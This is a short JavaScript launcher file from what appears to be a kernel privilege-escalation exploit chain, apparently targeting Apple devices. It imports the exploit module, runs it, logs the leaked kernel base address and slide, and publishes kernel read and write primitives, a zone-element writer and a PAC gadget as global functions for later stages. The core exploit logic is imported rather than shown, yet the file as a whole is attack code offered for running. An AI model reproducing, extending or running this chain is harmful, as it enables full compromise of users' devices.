// Import helpers for side effects, like fcall_init()
import './pe_helpers.js';

// Import the main exploit logic and exported functions
import {
    pe,
    mpd_kernel_base,
    mpd_kernel_slide,
    mpd_js_thread_spawn,
    mpd_js_thread_join,
    mpd_kread64,
    mpd_kwrite64,
    mpd_kwrite_length,
    mpd_kread_length,
    mpd_kwrite_zone_element,
    mpd_control_socket,
    mpd_rw_socket,
    mpd_pacia_gadget,
} from './pe_exploit.js';

// Run the exploit
pe();

// Post-exploitation logging
LOG("[+] PE Post-Exploitation !!!");
LOG(`[+] kernel_base: ${mpd_kernel_base().hex()}`);
LOG(`[+] kernel_slide: ${mpd_kernel_slide().hex()}`);

// The original script seemed to assign this to a global scope.
// We'll keep it here to maintain compatibility.
let main = {};
main.chainData = {
    "chosenOffsets": null
};

// Also re-exporting the mpd_ functions in case they are expected to be globally available.
// Depending on the execution environment, this might not be necessary.
globalThis.mpd_js_thread_spawn = mpd_js_thread_spawn;
globalThis.mpd_js_thread_join = mpd_js_thread_join;
globalThis.mpd_pe = pe;
globalThis.mpd_kread64 = mpd_kread64;
globalThis.mpd_kwrite64 = mpd_kwrite64;
globalThis.mpd_kwrite_length = mpd_kwrite_length;
globalThis.mpd_kread_length = mpd_kread_length;
globalThis.mpd_kwrite_zone_element = mpd_kwrite_zone_element;
globalThis.mpd_control_socket = mpd_control_socket;
globalThis.mpd_rw_socket = mpd_rw_socket;
globalThis.mpd_pacia_gadget = mpd_pacia_gadget;
globalThis.mpd_kernel_slide = mpd_kernel_slide;
globalThis.mpd_kernel_base = mpd_kernel_base;
globalThis.main = main;
